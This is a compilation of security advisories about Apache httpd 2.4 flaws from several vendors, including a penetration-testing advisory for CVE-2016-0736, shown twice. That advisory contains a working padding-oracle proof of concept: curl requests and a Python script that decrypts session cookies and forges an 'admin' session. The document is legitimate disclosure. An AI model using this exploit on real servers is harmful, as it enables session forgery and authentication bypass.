RHSA-2017:1415 - Security Advisory

Issued:
2017-06-07
Updated:
2017-06-07
# RHSA-2017:1415 - Security Advisory

* [Overview](#overview)

## Synopsis

Important: Red Hat JBoss Core Services Apache HTTP Server 2.4.23 Service Pack 1

## Type/Severity

Security Advisory: Important

## Topic

An update is now available for Red Hat JBoss Core Services.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Red Hat JBoss Core Services is a set of supplementary software for Red Hat JBoss middleware products. This software, such as Apache HTTP Server, is common to multiple JBoss middleware products, and is packaged under Red Hat JBoss Core Services to allow for faster distribution of updates, and for a more consistent update experience.

This release of Red Hat JBoss Core Services Apache HTTP Server 2.4.23 Service Pack 1 serves as a replacement for Red Hat JBoss Core Services Apache HTTP Server 2.4.23, and includes bug fixes, which are documented in the Release Notes document linked to in the References.

Security Fix(es):

* A memory leak flaw was found in the way OpenSSL handled TLS status request extension data during session renegotiation. A remote attacker could cause a TLS server using OpenSSL to consume an excessive amount of memory and, possibly, exit unexpectedly after exhausting all available memory, if it enabled OCSP stapling support. (CVE-2016-6304)
* It was discovered that the mod\_session\_crypto module of httpd did not use any mechanisms to verify integrity of the encrypted session data stored in the user's browser. A remote attacker could use this flaw to decrypt and modify session data using a padding oracle attack. (CVE-2016-0736)
* It was discovered that the mod\_auth\_digest module of httpd did not properly check for memory allocation failures. A remote attacker could use this flaw to cause httpd child processes to repeatedly crash if the server used HTTP digest authentication. (CVE-2016-2161)
* A timing attack flaw was found in OpenSSL that could allow a malicious user with local access to recover ECDSA P-256 private keys. (CVE-2016-7056)
* A denial of service flaw was found in the way the TLS/SSL protocol defined processing of ALERT packets during a connection handshake. A remote attacker could use this flaw to make a TLS/SSL server consume an excessive amount of CPU and fail to accept connections from other clients. (CVE-2016-8610)
* It was discovered that the HTTP parser in httpd incorrectly allowed certain characters not permitted by the HTTP protocol specification to appear unencoded in HTTP request headers. If httpd was used in conjunction with a proxy or backend server that interpreted those characters differently, a remote attacker could possibly use this flaw to inject data into HTTP responses, resulting in proxy cache poisoning. (CVE-2016-8743)
* A vulnerability was found in httpd's handling of the LimitRequestFields directive in mod\_http2, affecting servers with HTTP/2 enabled. An attacker could send crafted requests with headers larger than the server's available memory, causing httpd to crash. (CVE-2016-8740)

Red Hat would like to thank the OpenSSL project for reporting CVE-2016-6304 and Shi Lei (Gear Team of Qihoo 360 Inc.) for reporting CVE-2016-8610. Upstream acknowledges Shi Lei (Gear Team of Qihoo 360 Inc.) as the original reporter of CVE-2016-6304.

Advisory: Padding Oracle in Apache mod\_session\_crypto
During a penetration test, RedTeam Pentesting discovered a Padding
Oracle vulnerability in mod\_session\_crypto of the Apache web server.
This vulnerability can be exploited to decrypt the session data and even
encrypt attacker-specified data.
### Details
- Product: Apache HTTP Server mod\_session\_crypto
- Affected Versions: 2.3 to 2.5
- Fixed Versions: 2.4.25
- Vulnerability Type: Padding Oracle
- Security Risk: high
- Vendor URL: `https://httpd.apache.org/docs/trunk/mod/mod\_session\_crypto.html`
- Vendor Status: fixed version released
- Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt`
- Advisory Status: published
- CVE: CVE-2016-0736
- CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736`
### Introduction
The module mod\_session\_crypto of the Apache HTTP Server can be used in
conjunction with the modules mod\_session and mod\_session\_cookie to store
session data in an encrypted cookie within the users' browsers. This
avoids server-side session state so that incoming HTTP requests can be
easily distributed amongst a number of application web servers which do
not need to share session state.
### More Details
The module mod\_session\_crypto uses symmetric cryptography to encrypt and
decrypt session data and uses mod\_session to store the encrypted data in
a cookie (usually called "session") within the user's browser. The
decrypted session is then made available to the application in an
environment variable (in case of a CGI script) or in a custom HTTP
request header. The application can add a custom HTTP response header
(usually "X-Replace-Session") which instructs the HTTP server to replace
the session's content with the value of the header. Detailed
instructions to set up mod\_session and mod\_session\_crypto can be found
in the documentation
().
The module mod\_session\_crypto is configured to use either 3DES or AES
with various key sizes, defaulting to AES256. Encryption is handled by
the function "encrypt\_string":
`modules/session/mod\_session\_crypto.c`:
```
/\*\*
\* Encrypt the string given as per the current config.
\*
\* Returns APR\_SUCCESS if successful.
\*/
static apr\_status\_t encrypt\_string(request\_rec \* r, const apr\_crypto\_t \*f,
session\_crypto\_dir\_conf \*dconf, const char \*in, char \*\*out)
{
[...]
apr\_crypto\_key\_t \*key = NULL;
[...]
const unsigned char \*iv = NULL;
[...]
/\* use a uuid as a salt value, and prepend it to our result \*/
apr\_uuid\_get(&salt);
[...]
res = apr\_crypto\_passphrase(&key, &ivSize, passphrase,
strlen(passphrase),
(unsigned char \*) (&salt), sizeof(apr\_uuid\_t),
\*cipher, APR\_MODE\_CBC, 1, 4096, f, r->pool);
[...]
res = apr\_crypto\_block\_encrypt\_init(█, &iv, key, &blockSize, r->pool);
[...]
res = apr\_crypto\_block\_encrypt(&encrypt, &encryptlen, (unsigned char \*)in,
strlen(in), block);
[...]
res = apr\_crypto\_block\_encrypt\_finish(encrypt + encryptlen, &tlen, block);
[...]
/\* prepend the salt and the iv to the result \*/
combined = apr\_palloc(r->pool, ivSize + encryptlen + sizeof(apr\_uuid\_t));
memcpy(combined, &salt, sizeof(apr\_uuid\_t));
memcpy(combined + sizeof(apr\_uuid\_t), iv, ivSize);
memcpy(combined + sizeof(apr\_uuid\_t) + ivSize, encrypt, encryptlen);
/\* base64 encode the result \*/
base64 = apr\_palloc(r->pool, apr\_base64\_encode\_len(ivSize + encryptlen +
sizeof(apr\_uuid\_t) + 1)
\* sizeof(char));
[...]
return res;
}
```
The source code shows that an encryption key is derived from the
configured password and a randomly chosen salt by calling the function
"apr\_crypto\_passphrase". This function internally uses PBKDF2 to derive
the key. The data is then encrypted and the salt and IV prepended to the
encrypted data. Before returning to the caller, the result is encoded as
base64.
This procedure does not guarantee integrity of the ciphertext, so the
Apache module is unable to detect whether a session sent back to the
server has been tampered with. Depending on the application this often
means that attackers are able to exploit a Padding Oracle vulnerability.
This allows decrypting the session and encrypting arbitrary data chosen
by the attacker.
### Proof of Concept
The vulnerability can be reproduced as follows. First, the modules
mod\_session, mod\_session\_crypto and mod\_session\_cookie are enabled and
configured:
```
Session On
SessionEnv On
SessionCookieName session path=/
SessionHeader X-Replace-Session
SessionCryptoPassphrase RedTeam
```
In addition, CGI scripts are enabled for a folder and the following CGI
script is saved as "status.rb" and is made available to clients:
```
#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
data = CGI.parse(ENV['HTTP\_SESSION'])
if data.has\_key? 'username'
puts
puts "your username is %s" % data['username']
exit
end
puts "X-Replace-Session: username=guest&timestamp=" + Time.now.strftime("%s")
puts
puts "not logged in"
```
Once the CGI script is correctly set up, the command-line HTTP client curl
can be used to access it:
```
$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb
HTTP/1.1 200 OK
Date: Tue, 19 Jan 2016 13:23:19 GMT
Server: Apache/2.4.10 (Ubuntu)
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Cache-Control: no-cache
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Transfer-Encoding: chunked
Content-Type: application/x-ruby
not logged in
```
The example shows that a new encrypted cookie with the name "session" is
returned, and the response body contains the text "not logged in".
Calling the script again with the cookie just returned reveals that the
username in the session is set to "guest":
```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \
http://127.0.0.1:8080/cgi-bin/status.rb
your username is guest
```
Sending a modified cookie ending in "u=" instead of "U=" will invalidate
the padding at the end of the ciphertext, so the session cannot be
decrypted correctly and is therefore not passed to the CGI script, which
returns the text "not logged in" again:
```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \
http://127.0.0.1:8080/cgi-bin/status.rb
not logged in
```
This verifies the existence of the Padding Oracle vulnerability. The
Python library () python-paddingoracle was then used to implement
decrypting the session by exploiting the Padding Oracle vulnerability.
`exploit.py`:
```
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests
class PadBuster(PaddingOracle):
def \_\_init\_\_(self, valid\_cookie, \*\*kwargs):
super(PadBuster, self).\_\_init\_\_(\*\*kwargs)
self.wait = kwargs.get('wait', 2.0)
self.valid\_cookie = valid\_cookie
def oracle(self, data, \*\*kwargs):
v = b64encode(self.valid\_cookie+data)
response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',
cookies=dict(session=v), stream=False, timeout=5, verify=False)
if 'username' in response.content:
logging.debug('No padding exception raised on %r', v)
return
raise BadPaddingException
if \_\_name\_\_ == '\_\_main\_\_':
import logging
import sys
if not sys.argv[2:]:
print 'Usage: [encrypt|decrypt]  '
sys.exit(1)
logging.basicConfig(level=logging.WARN)
mode = sys.argv[1]
session = b64decode(sys.argv[2])
padbuster = PadBuster(session)
if mode == "decrypt":
cookie = padbuster.decrypt(session[32:], block\_size=16, iv=session[16:32])
print('Decrypted session:\n%r' % cookie)
elif mode == "encrypt":
key = session[0:16]
plaintext = sys.argv[3]
s = padbuster.encrypt(plaintext, block\_size=16)
data = b64encode(key+s[0:len(s)-16])
print('Encrypted session:\n%s' % data)
else:
print "invalid mode"
sys.exit(1)
```
This Python script can then be used to decrypt the session:
```
$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=
Decrypted session:
b'username=guest&timestamp=1453282205\r\r\r\r\r\r\r\r\r\r\r\r\r'
real 6m43.088s
user 0m15.464s
sys 0m0.976s
```
In this sample application, the username and a timestamp are included in
the session data. The Python script can also be used to encrypt a new
session containing the username "admin":
```
$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\
RU= username=admin
Encrypted session:
sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY
real3m38.002s
users0m8.536s
sys0m0.512s
```
Sending this newly encrypted session to the server shows that the
username is now "admin":
```
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\
zmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb
your username is admin
```
### Workaround
Use a different means to store the session, e.g. in a database by using
mod\_session\_dbd.
### Fix
Update to Apache HTTP version 2.4.25 (see ).
### Security Risk
Applications which use mod\_session\_crypto usually store sensitive values
in the session and rely on an attacker's inability to decrypt or modify
the session. Successful exploitation of the Padding Oracle vulnerability
subverts this mechanism and allows to construct sessions with arbitrary
attacker-specified content. Depending on the application this may
completely subvert the application's security. Therefore, this
vulnerability poses a high risk.

Package        : apache2
CVE ID         : CVE-2016-0736 CVE-2016-2161 CVE-2016-8743

Several vulnerabilities were discovered in the Apache2 HTTP server.

CVE-2016-0736

  RedTeam Pentesting GmbH discovered that mod_session_crypto was
  vulnerable to padding oracle attacks, which could allow an attacker
  to guess the session cookie.

CVE-2016-2161

  Maksim Malyutin discovered that malicious input to mod_auth_digest
  could cause the server to crash, causing a denial of service.

CVE-2016-8743

  David Dennerline, of IBM Security's X-Force Researchers, and Régis
  Leroy discovered problems in the way Apache handled a broad pattern
  of unusual whitespace patterns in HTTP requests. In some
  configurations, this could lead to response splitting or cache
  pollution vulnerabilities.  To fix these issues, this update makes
  Apache httpd be more strict in what HTTP requests it accepts.

  If this causes problems with non-conforming clients, some checks can
  be relaxed by adding the new directive "HttpProtocolOptions unsafe"
  to the configuration.

This update also fixes the issue where mod_reqtimeout was not enabled
by default on new installations.

For the stable distribution (jessie), these problems have been fixed in
version 2.4.10-10+deb8u8.

For the testing (stretch) and unstable (sid) distributions, these
problems have been fixed in version 2.4.25-1.

We recommend that you upgrade your apache2 packages.

#### Description

The Apache HTTP Server through 2.4.23 follows RFC 3875 section 4.1.18 and therefore does not protect applications from the presence of untrusted client data in the HTTP\_PROXY environment variable, which might allow remote attackers to redirect an application's outbound HTTP traffic to an arbitrary proxy server via a crafted Proxy header in an HTTP request, aka an "httpoxy" issue. NOTE: the vendor states "This mitigation has been assigned the identifier CVE-2016-5387"; in other words, this is not a CVE ID for a vulnerability.

## Topic

Updated httpd24 packages are now available as a part of Red Hat Software Collections 2.4 for Red Hat Enterprise Linux.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The Apache HTTP Server is a powerful, efficient, and extensible web server. The httpd24 packages provide a recent stable release of version 2.4 of the Apache HTTP Server, along with the mod\_auth\_kerb module.

The httpd24 Software Collection has been upgraded to version 2.4.25, which provides a number of bug fixes and enhancements over the previous version. For detailed changes, see the Red Hat Software Collections 2.4 Release Notes linked from the References section. (BZ#1404778)

Security Fix(es):

* It was discovered that the mod\_session\_crypto module of httpd did not use any mechanisms to verify integrity of the encrypted session data stored in the user's browser. A remote attacker could use this flaw to decrypt and modify session data using a padding oracle attack. (CVE-2016-0736)
* A denial of service flaw was found in httpd's mod\_http2 module. A remote attacker could use this flaw to block server threads for long times, causing starvation of worker threads, by manipulating the flow control windows on streams. (CVE-2016-1546)
* It was discovered that the mod\_auth\_digest module of httpd did not properly check for memory allocation failures. A remote attacker could use this flaw to cause httpd child processes to repeatedly crash if the server used HTTP digest authentication. (CVE-2016-2161)
* It was discovered that the HTTP parser in httpd incorrectly allowed certain characters not permitted by the HTTP protocol specification to appear unencoded in HTTP request headers. If httpd was used in conjunction with a proxy or backend server that interpreted those characters differently, a remote attacker could possibly use this flaw to inject data into HTTP responses, resulting in proxy cache poisoning. (CVE-2016-8743)

Note: The fix for the CVE-2016-8743 issue causes httpd to return "400 Bad Request" error to HTTP clients which do not strictly follow HTTP protocol specification. A newly introduced configuration directive "HttpProtocolOptions Unsafe" can be used to re-enable the old less strict parsing. However, such setting also re-introduces the CVE-2016-8743 issue.

* A vulnerability was found in httpd's handling of the LimitRequestFields directive in mod\_http2, affecting servers with HTTP/2 enabled. An attacker could send crafted requests with headers larger than the server's available memory, causing httpd to crash. (CVE-2016-8740)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing the updated packages, the httpd daemon will be restarted automatically.

#### Description

There is a carry propagating bug in the Broadwell-specific Montgomery multiplication procedure in OpenSSL 1.0.2 and 1.1.0 before 1.1.0c that handles input lengths divisible by, but longer than 256 bits. Analysis suggests that attacks against RSA, DSA and DH private keys are impossible. This is because the subroutine in question is not used in operations with the private key itself and an input of the attacker's direct choice. Otherwise the bug can manifest itself as transient authentication and key negotiation failures or reproducible erroneous outcome of public-key operations with specially crafted input. Among EC algorithms only Brainpool P-512 curves are affected and one presumably can attack ECDH key negotiation. Impact was not analyzed in detail, because pre-requisites for attack are considered unlikely. Namely multiple clients have to choose the curve in question and the server has to share the private key among them, neither of which is default behaviour. Even then only clients that chose the curve will be affected.

# [R5] SecurityCenter 5.4.3 Fixes Multiple Vulnerabilities

Medium

[← View More Security Advisories](/security)
### Synopsis

SecurityCenter has recently been discovered to contain several vulnerabilities. Four issues in the SC code were discovered during internal testing by Barry Clark, and several third-party libraries were upgraded as part of our internal security process. Note that the library vulnerabilities were not fully diagnosed so SecurityCenter is possibly impacted. Tenable opted to upgrade the libraries as it was more efficient than diagnosing each issue. Details of the issues are below, with VDB IDs and/or internal IDs for your tracking pleasure. Note that not all library vulnerabilities have a CVE assignment:

* PHP ext/phar/phar.c phar\_parse\_pharfile() Function Phar Archive Handling Out-of-bounds Read DoS
* PHP ext/exif/exif.c exif\_convert\_any\_to\_int() Function TIFF / JPEG Image Tag Handling Floating Pointer Exception Remote DoS (CVE-2016-10158)
* PHP ext/standard/var\_unserializer.c finish\_nested\_data() Function Unserialized Data Handling Out-of-bounds Read Remote Weakness (CVE-2016-10161)
* PHP ext/phar/phar.c phar\_parse\_pharfile() Function Phar Archive Handling Off-by-one Remote Buffer Overflow DoS (CVE-2016-10160)
* PHP ext/phar/phar.c phar\_parse\_pharfile() Function Phar Archive Handling Integer Overflow DoS (CVE-2016-10159)
* GD Graphics Library (LibGD) gd\_gd2.c gdImageCreateFromGd2Ctx() Function Insufficient Image Data Handling DoS (CVE-2016-10167)
* OpenSSL crypto/bn/asm/x86\_64-mont5.pl Montgomery Squaring Procedure BN\_mod\_exp Incorrect Results Private Key Derivation Weakness (CVE-2017-3732)
* OpenSSL crypto/evp/e\_chacha20\_poly1305.c CHACHA20-POLY1305 Cipher Packet Handling Out-of-bounds Read Remote DoS (CVE-2017-3731)
* OpenSSL crypto/bn/asm/x86\_64-mont.pl Montgomery Multiplication Incorrect Results Weakness (CVE-2016-7055)
* Apache HTTP Server User-Agent Whitespace Pattern Handling Cache Pollution Response Confusion Cross-session Information Disclosure (CVE-2016-8743)
* Apache HTTP Server modules/aaa/mod\_auth\_digest.c Client Entry Allocation Shared Memory Space Exhaustion Remote DoS (CVE-2016-2161)
* Apache HTTP Server Session Data / Cookie Padding Oracle Attack Information Disclosure Weakness (CVE-2016-0736)
* Apache HTTP Server mod\_http2 HTTP/2 CONTINUATION Frame Handling Memory Exhaustion Remote DoS (CVE-2016-8740)
* Apache HTTP Server Proxy Header Injection HTTP\_PROXY Environment Variable Overwrite Remote Proxy Manipulation (CVE-2016-5387 / CVE-2016-1000104 / CVE-2016-1000102)
* libcurl lib/rand.c randit() Function Uninitialized Random Value Weak Cryptographic Operations (CVE-2016-9594)
* Authenticated Stored XSS (Internal ID 31620)
* Authenticated Stored XSS (Internal ID 31619)
* Authenticated Stored XSS (Internal ID 31498)
* Authenticated Stored XSS (Internal ID 31430)

Please note that Tenable strongly recommends that SecurityCenter be installed on a subnet that is not Internet addressable.

# Apache: Multiple vulnerabilities — GLSA **201701-36**

Multiple vulnerabilities have been found in Apache, the worst of
which could lead to a Denial of Service condition.

### Affected packages

| Package | **www-servers/apache** on all architectures |
| --- | --- |
| Affected versions | < **2.4.25** |
| Unaffected versions | >= **2.4.25** |

### Background

The Apache HTTP server is one of the most popular web servers on the
Internet.

### Description

Multiple vulnerabilities have been discovered in Apache. Please review
the CVE identifiers, upstream Apache Software Foundation documentation,
and HTTPoxy website referenced below for details.

### Impact

A remote attacker could cause a Denial of Service condition via multiple
vectors or response splitting and cache pollution. Additionally, an
attacker could intercept unsecured (HTTP) transmissions via the HTTPoxy
vulnerability.

### Workaround

There is no known workaround at this time.

### Resolution

All Apache users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/apache-2.4.25"

```

Advisory: Padding Oracle in Apache mod_session_crypto

During a penetration test, RedTeam Pentesting discovered a Padding
Oracle vulnerability in mod_session_crypto of the Apache web server.
This vulnerability can be exploited to decrypt the session data and even
encrypt attacker-specified data.

Details
=======

Product: Apache HTTP Server mod_session_crypto
Affected Versions: 2.3 to 2.5
Fixed Versions: 2.4.25
Vulnerability Type: Padding Oracle
Security Risk: high
Vendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt
Advisory Status: published
CVE: CVE-2016-0736
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736

Introduction
============

The module mod_session_crypto of the Apache HTTP Server can be used in
conjunction with the modules mod_session and mod_session_cookie to store
session data in an encrypted cookie within the users' browsers. This
avoids server-side session state so that incoming HTTP requests can be
easily distributed amongst a number of application web servers which do
not need to share session state.

More Details
============

The module mod_session_crypto uses symmetric cryptography to encrypt and
decrypt session data and uses mod_session to store the encrypted data in
a cookie (usually called "session") within the user's browser. The
decrypted session is then made available to the application in an
environment variable (in case of a CGI script) or in a custom HTTP
request header. The application can add a custom HTTP response header
(usually "X-Replace-Session") which instructs the HTTP server to replace
the session's content with the value of the header. Detailed
instructions to set up mod_session and mod_session_crypto can be found
in the documentation:
https://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples

The module mod_session_crypto is configured to use either 3DES or AES
with various key sizes, defaulting to AES256. Encryption is handled by
the function "encrypt_string":

modules/session/mod_session_crypto.c
------------------------------------------------------------------------
/**
 * Encrypt the string given as per the current config.
 *
 * Returns APR_SUCCESS if successful.
 */
static apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,
        session_crypto_dir_conf *dconf, const char *in, char **out)
{
[...]
    apr_crypto_key_t *key = NULL;
[...]
    const unsigned char *iv = NULL;
[...]

    /* use a uuid as a salt value, and prepend it to our result */
    apr_uuid_get(&salt);

[...]

    res = apr_crypto_passphrase(&key, &ivSize, passphrase,
            strlen(passphrase),
            (unsigned char *) (&salt), sizeof(apr_uuid_t),
            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);

[...]

    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);
[...]
    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,
            strlen(in), block);
[...]
    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);
[...]

    /* prepend the salt and the iv to the result */
    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));
    memcpy(combined, &salt, sizeof(apr_uuid_t));
    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);
    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);

    /* base64 encode the result */
    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +
                    sizeof(apr_uuid_t) + 1)
            * sizeof(char));
[...]
    return res;
}
------------------------------------------------------------------------

The source code shows that an encryption key is derived from the
configured password and a randomly chosen salt by calling the function
"apr_crypto_passphrase". This function internally uses PBKDF2 to derive
the key. The data is then encrypted and the salt and IV prepended to the
encrypted data. Before returning to the caller, the result is encoded as
base64.

This procedure does not guarantee integrity of the ciphertext, so the
Apache module is unable to detect whether a session sent back to the
server has been tampered with. Depending on the application this often
means that attackers are able to exploit a Padding Oracle vulnerability.
This allows decrypting the session and encrypting arbitrary data chosen
by the attacker.

Proof of Concept
================

The vulnerability can be reproduced as follows. First, the modules
mod_session, mod_session_crypto and mod_session_cookie are enabled and
configured:

------------------------------------------------------------------------
Session On
SessionEnv On
SessionCookieName session path=/
SessionHeader X-Replace-Session
SessionCryptoPassphrase RedTeam
------------------------------------------------------------------------

In addition, CGI scripts are enabled for a folder and the following CGI
script is saved as "status.rb" and is made available to clients:

------------------------------------------------------------------------
#!/usr/bin/env ruby

require 'cgi'

cgi = CGI.new
data = CGI.parse(ENV['HTTP_SESSION'])

if data.has_key? 'username'
        puts
        puts "your username is %s" % data['username']
        exit
end

puts "X-Replace-Session: username=guest&timestamp=" + Time.now.strftime("%s")
puts
puts "not logged in"
------------------------------------------------------------------------

Once the CGI script is correctly set up, the command-line HTTP client curl
can be used to access it:

------------------------------------------------------------------------
$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb
HTTP/1.1 200 OK
Date: Tue, 19 Jan 2016 13:23:19 GMT
Server: Apache/2.4.10 (Ubuntu)
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Cache-Control: no-cache
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Transfer-Encoding: chunked
Content-Type: application/x-ruby

not logged in
------------------------------------------------------------------------

The example shows that a new encrypted cookie with the name "session" is
returned, and the response body contains the text "not logged in".
Calling the script again with the cookie just returned reveals that the
username in the session is set to "guest":

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \
http://127.0.0.1:8080/cgi-bin/status.rb

your username is guest
------------------------------------------------------------------------

Sending a modified cookie ending in "u=" instead of "U=" will invalidate
the padding at the end of the ciphertext, so the session cannot be
decrypted correctly and is therefore not passed to the CGI script, which
returns the text "not logged in" again:

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \
http://127.0.0.1:8080/cgi-bin/status.rb

not logged in
------------------------------------------------------------------------

This verifies the existence of the Padding Oracle vulnerability. The
Python library[1] python-paddingoracle was then used to implement
decrypting the session by exploiting the Padding Oracle vulnerability.

exploit.py
------------------------------------------------------------------------
'''

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests

class PadBuster(PaddingOracle):
    def __init__(self, valid_cookie, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.wait = kwargs.get('wait', 2.0)
        self.valid_cookie = valid_cookie

    def oracle(self, data, **kwargs):
        v = b64encode(self.valid_cookie+data)

        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',
                cookies=dict(session=v), stream=False, timeout=5, verify=False)

        if 'username' in response.content:
            logging.debug('No padding exception raised on %r', v)
            return

        raise BadPaddingException

if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[2:]:
        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'
        sys.exit(1)

    logging.basicConfig(level=logging.WARN)
    mode = sys.argv[1]
    session = b64decode(sys.argv[2])
    padbuster = PadBuster(session)

    if mode == "decrypt":
        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])
        print('Decrypted session:\n%r' % cookie)
    elif mode == "encrypt":
        key = session[0:16]
        plaintext = sys.argv[3]

        s = padbuster.encrypt(plaintext, block_size=16)

        data = b64encode(key+s[0:len(s)-16])
        print('Encrypted session:\n%s' % data)
    else:
        print "invalid mode"
        sys.exit(1)

'''
------------------------------------------------------------------------

This Python script can then be used to decrypt the session:

------------------------------------------------------------------------
$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=
Decrypted session:
b'username=guest&timestamp=1453282205\r\r\r\r\r\r\r\r\r\r\r\r\r'

real    6m43.088s
user    0m15.464s
sys 0m0.976s
------------------------------------------------------------------------

In this sample application, the username and a timestamp are included in
the session data. The Python script can also be used to encrypt a new
session containing the username "admin":

------------------------------------------------------------------------
$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\
RU= username=admin

Encrypted session:
sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY

real3m38.002s
users0m8.536s
sys0m0.512s

------------------------------------------------------------------------

Sending this newly encrypted session to the server shows that the
username is now "admin":

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\
zmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb

your username is admin
------------------------------------------------------------------------

Workaround
==========

Use a different means to store the session, e.g. in a database by using
mod_session_dbd.

Fix
===

Update to Apache HTTP version 2.4.25 (see [2]).

Security Risk
=============

Applications which use mod_session_crypto usually store sensitive values
in the session and rely on an attacker's inability to decrypt or modify
the session. Successful exploitation of the Padding Oracle vulnerability
subverts this mechanism and allows to construct sessions with arbitrary
attacker-specified content. Depending on the application this may
completely subvert the application's security. Therefore, this
vulnerability poses a high risk.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
